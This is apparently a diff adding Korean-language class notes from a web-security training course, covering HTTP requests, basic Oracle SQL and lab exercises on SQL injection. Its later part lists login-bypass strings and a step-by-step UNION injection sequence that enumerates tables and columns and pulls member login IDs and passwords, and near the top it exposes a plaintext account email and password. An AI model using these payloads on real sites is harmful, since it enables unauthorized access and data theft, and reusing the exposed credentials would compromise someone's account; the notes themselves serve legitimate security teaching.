@@ -1,0 +1,306 @@
+Burpsuite
+VSCODE
+D2Coding
+Oracle DB XE - oracle db xe download
+SQL Developer
+
+- 구글에 sql developer download 검색
+맨위에 with jdk 11 <- 다운
+
+ID : syoracle@ruu.kr
+PW : roWkwmd!23 개짜증!23
+
+Python
+
+
+naver.com/search
+
+
+keyword=__검색어__
+
+URL Parameter
+
+GET 
+test.com?name=홍길동&addr=서울&나이=25&취미=축구
+
+POST
+test.com
+
+name=홍길동&addr=서울&나이=25&취미=축구
+
+POST -> XML
+<name>
+    홍길동
+</name>
+<addr>
+    서울
+</addr>
+....
+
+POST -> JSON
+{
+    ["name":"홍길동",
+    "addr":"서울",
+    ..,
+    ..,
+    ..,]
+        
+}
+
+
+기존 방식
+
+
+게시판 글쓰기
+GET/POST /board/write?id=글번호
+PUT /board/글번호
+
+게시판 수정
+GET /board/edit?id=글번호
+MODIFY /board/글번호
+
+게시판 글 삭제
+GET /board/delete?id=글번호
+DELETE /board/글번호
+
+XSS vs CSRF (vs SSRF vs SSTI)
+
+SSTI
+-> Server-side Template Injection
+
+JSP ASP PHP -> Template Engine
+-> Springboot - Thymeleaf
+   Flask - Jinja2
+    Ruby - erb
+
+윈도우 계정명 한글 - X
+D: - X
+1. 윈도우 재설치
+
+2.
+docker -> oracle linux -> oracle db install sh
+docker run -p 1521:1521 oracle
+
+3.
+VM 에 Windows, Linux -> Oracle -> SQL Developer-VM Oracle
+
+4.
+sqlfiddle
+sqltest
+
+RDBMS
+Oracle, Mysql-(MariaDB), MSSQL,...
+
+- 계정 생성
+
+Create user TEST identified by 1234;
+
+CREATE Table FRIENDS
+(
+    name varchar2(10),
+    addr varchar2(10),
+    age  number(4),
+    hobby varchar2(10)
+);
+
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍일','서울',29,'축구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍이','부산',25,'야구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍삼','대구',28,'배구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍사','서울',25,'축구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍오','대전',27,'야구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍육','대전',28,'배구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍칠','대구',22,'축구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍팔','부산',23,'야구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍구','부산',22,'배구');
+INSERT INTO FRIENDS (name, addr, age, hobby) VALUES ('멍멍십','서울',29,'축구');
+
+
+Database
+'29' <- 문자형
+29
+
+집이 서울,    나이가 >= 25
+- AND 연산
+T and T -> T
+T and F -> F
+F and T -> F
+F and F -> F
+
+- OR 연산
+T and T -> T
+T or F  -> T
+F or T  -> T
+F or F  -> F
+
+F or T and F or T
+     -------
+F  or   F  or    T
+    F 
+             T
+
+
+
+ID [   test                  ] 
+PW [   0000' or '1'='1       ]
+         로그인
+
+test.com/login?id=test&pw=0000
+
+login 으로 접근했을때
+
+
+id      pw
+===========
+test     1234
+admin     pass
+
+query = select * from where id = 'test' and pw = '0000' or '1'='1';
+result = db.execute(query);
+if(result == 0) {
+    로그인 실패;
+} else {
+    로그인 성공;
+}
+
+
+인증 분리
+
+query = select pw from where id = '입력한아이디';
+result = db.execute(query);
+if(hash(입력한비밀번호) == result) {
+    로그인 성공;
+} else {
+    로그인 실패;
+}
+
+selct * from 계정
+where id='z_answer@eqst2.com' or '1'='1' and pw='0000'
+
+
+   id                 pw
+===================================
+z_answer@eqst2.com    adkfjkaldwsfj
+pppp@pppp.com         pppp
+
+id : z_answer@eqst2.com' or '1'='1
+pw : 0000
+
+* SQL Injection
+ 문제 2번, 3번 풀어주시고
+
+JSP 문제 x번
+1. 입력한 값 :
+2. 정답 :
+
+
+Gather Town DM 보내주세요.
+
+푸신분들 PHP 문제 2번도 보내주세요.
+-- <- 이거 말고!!!!!
+
+ASP : MSSQL
+JSP : Oracle
+PHP : MySQL
+
+
+SELECT * from FRIENDS where
+id = 'z_answer@eqst3.com'# and pw ='입력비번'
+
+z_answer@eqst3.com'#
+- Oracle
+* 테이블 정보
+all_tables
+user_tables
+
+* 컬럼 정보
+all_tab_columns
+user_tab_columns
+
+
+
+- UNION SQL Injection 공격 순서
+
+SELECT * FROM FRIENDS WHERE NAME = '검색어'
+
+1. 현 쿼리문의 컬럼 개수 파악
+' order by 숫자--
+SELECT * FROM FRIENDS WHERE NAME = '' order by 6
+
+
+2. 자료형 파악
+null -> 숫자, 문자 
+' union select null, null... from dual--
+
+3. 테이블명
+' union select table_name, null...
+from user_tables--
+
+4. 컬럼명
+select column_name from all_tab_columnbs where table_name = '테이블명'
+
+' union select column_name, null..
+from all_tab_columns where table_name = 'MEMBERS'--
+
+select 컬럼들 from 주소 
+where 읍면동 = '삼성동' order by 123--'
+삼성동' order by 5 -- O
+삼성동' order by 6 -- X
+
+1. 컬럼의 개수 : 5개
+2. 자료형 : 모두 문자형
+삼성동' union select 'null', null, null, null, null from dual--
+
+삼성동' union select 'a', 'b', 'c', 'd', 'e' from dual--
+
+3. 테이블 명 : SQL_UNION_ANSWER
+select table_name from user_tables
+select table_name, 'a','a','a','a'
+from user_tables
+삼성동' union select table_name, 'a','a','a','a' from user_tables --
+
+4. SQL_UNION_ANSWER 테이블의 컬럼명 
+ANSWER_COLUMN, REG_ACCT_ID, REG_DT, UDT_ACCT_ID, UDT_DT
+
+select column_name from user_tab_columns where table_name = 'SQL_UNION_ANSWER'
+
+select column_name, 'a', 'a', 'a', 'a' from user_tab_columns where table_name = 'SQL_UNION_ANSWER'
+
+삼성동' union select column_name, 'a', 'a', 'a', 'a' from user_tab_columns where table_name = 'SQL_UNION_ANSWER' --
+
+5. 데이터 추출
+select answer_column from SQL_UNION_ANSEWR
+
+
+select answer_column, 'a','a','a','a' from SQL_UNION_ANSWER
+
+
+삼성동' union select answer_column, 'a','a','a','a' from SQL_UNION_ANSWER --
+
+select table_name, column_name, null, null, null from user_tab_columns
+
+
+삼성동' union select table_name, column_name, null, null, null from user_tab_columns --
+
+삼성동' union select * from sql_union_answer--
+
+select user_nm, login_id, pass, pwdq, email from member
+
+삼성동' union select user_nm, email, login_id, pass, pwdq from member--
+
+
+* UNION SQL Injection
+ PHP 문제 12번
+
+1. 공격에 사용한 공격구문
+  - 00 구문
+    ....
+  - 00 구문
+    ....
+2. 정답     
+
+DM 보내주세요.
+
+- 주소 찾기
+- MySQL
+
+useworld.ddns.net
